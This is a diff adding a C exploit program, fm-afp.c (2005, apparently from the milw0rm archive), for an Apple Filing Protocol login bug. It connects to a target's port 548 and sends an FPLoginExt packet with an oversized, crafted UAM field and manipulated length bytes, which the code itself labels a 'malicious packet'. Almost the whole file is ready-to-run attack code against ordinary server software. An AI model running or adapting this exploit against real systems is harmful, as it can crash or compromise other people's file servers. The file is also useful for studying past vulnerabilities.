@@ -1,0 +1,168 @@
+/* [ fm-afp.c ]
+* -( nemo @ felinemenace.org )- 2005
+*
+* Code for afp bug found by Braden Thomas.
+*
+* Again hello to everyone @ irc.pulltheplug.org
+*
+* need a challenge? -( http://pulltheplug.org )-
+*/
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/time.h>
+
+#define UAMSIZE    1022
+#define AFPVERSIZE 5
+#define PATHSIZE   30
+#define UASIZE     30
+#define AFPNSIZE   5
+#define AFPPORT    548
+#define BUFSIZE sizeof(dsi)+sizeof(fploginext) //+LEN+sizeof(afpEnd)
+
+typedef struct { char AFPVER[AFPVERSIZE]  ;} AFPVER_T;
+typedef struct { char UAM[UAMSIZE]        ;} UAM_T;
+typedef struct { char PATH[PATHSIZE]      ;} PATH_T;
+typedef struct { char UserAuthInfo[UASIZE];} UserAuth_t;
+typedef struct { char AFPName[AFPNSIZE]   ;} AFPName_t;
+
+typedef struct dsi { // Data Stream Interface.
+       u_int8_t  req;
+       u_int8_t  com;
+       u_int16_t id;
+       u_int32_t offset;
+       u_int32_t len;
+       u_int32_t reserved;
+} DSI_T;
+
+typedef struct FPLoginExt { // Establishes a session with a server using an Open Directory domain.
+       u_int8_t   command;
+       u_int8_t   pad;
+       u_int16_t  flags;
+       AFPVER_T   AFPVER;
+       UAM_T      UAM;
+       u_int8_t   UserNameType;
+       AFPName_t  UserName;
+       u_int8_t   PathType;
+       PATH_T     Pathname;
+       u_int8_t   pad2;
+       UserAuth_t UserAuthInfo;
+} FP_LoginExt_T;
+
+DSI_T dsi;
+FP_LoginExt_T fploginext;
+
+void banner()
+{
+       printf(" [ fm-afp.c ]\n");
+       printf("-( nemo@felinemenace.org )-\n\n");
+}
+
+void usage(char *progname)
+{
+       printf("usage: %s <ip address>.\n",progname);
+       exit(1);
+}
+
+int connect_afp(char *ip,int *sockfd)
+{
+       struct sockaddr_in target_addr;
+       int len;
+
+       *sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+       target_addr.sin_family = AF_INET;
+       target_addr.sin_port = htons(AFPPORT);
+       inet_aton(ip, &(target_addr.sin_addr));
+       memset(&(target_addr.sin_zero), '\0', 8);
+
+       if (connect(*sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1) {
+               return 1;
+       }
+       return 0;
+}
+
+void generate_packet(char *packet)
+{
+       int n;
+
+       dsi.req       = '\x00';
+       dsi.com       = '\x02';
+       dsi.id        = (u_int16_t)0x0002;
+       dsi.offset    = 0x00000000;
+       dsi.len       = 0x00000434;
+       dsi.reserved  = 0x00000000;
+
+       fploginext.command = (u_int8_t)'\x3f';
+       fploginext.pad     = (u_int8_t)'\x00';
+       fploginext.flags   = (u_int16_t)0x0000;
+       memcpy((char *)&(fploginext.AFPVER),"\x04\x6e\x65\x6d\x6f",5);
+       memset((char*)((&fploginext.UAM)),'\x70',sizeof(fploginext.UAM));
+       fploginext.UAM.UAM[0] = '\x0f';
+       fploginext.UAM.UAM[1] = '\xff';
+       fploginext.UAM.UAM[257] = '\xff';               //      size of next string.
+       fploginext.UAM.UAM[258] = '\xff';               //
+       fploginext.UAM.UAM[500] = '\x00';               //      size of next string.
+       fploginext.UAM.UAM[501] = '\xf0';               //
+
+       fploginext.UserNameType = (u_int8_t)'\x11';
+       memcpy((char *)&(fploginext.UserName),"\x54\x6e\x65\x6d\x6f",5);
+       fploginext.PathType = (u_int8_t)'\xff';
+       memcpy((char *)&(fploginext.Pathname),"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",30);
+       fploginext.pad2 = (u_int8_t)'\xff';
+       memcpy((char *)&(fploginext.UserAuthInfo),"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",30);
+
+       memcpy(packet, &dsi, sizeof(dsi));
+       packet += sizeof(dsi);
+       memcpy(packet, &fploginext, sizeof(fploginext));
+}
+
+int send_packet(char *packet,int *sockfd)
+{
+       if (send(*sockfd, packet, BUFSIZE, 0) == -1) {
+               return 1;
+       }
+
+       return 0;
+}
+
+int main(int ac, char **av)
+{
+       int sockfd;
+       char packet[BUFSIZE];
+       struct timeval time;
+
+       banner();
+       if(ac != 2) {
+               usage(*av);
+       }
+       printf("[+] Connecting to target: %s.\n",av[1]);
+       if(connect_afp(av[1],&sockfd)) {
+               printf("[-] An error has occured connecting to the target.\n");
+               exit(1);
+       }
+
+       printf("[+] Generating malicious packet.\n");
+       generate_packet(packet);
+
+       printf("[+] Sending packet to target.\n");
+       if(send_packet(packet,&sockfd)) {
+               printf("[-] Error sending packet.\n");
+               close(sockfd);
+               exit(1);
+       }
+
+       fd_set mySet;
+       FD_ZERO(&mySet);
+       FD_SET(sockfd, &mySet);
+       time.tv_sec = 0;
+       time.tv_usec = 50;
+       select(sockfd+1, &mySet, NULL, NULL, &time);
+
+       close(sockfd);
+       return 0;
+}
+
+// milw0rm.com [2005-02-08]
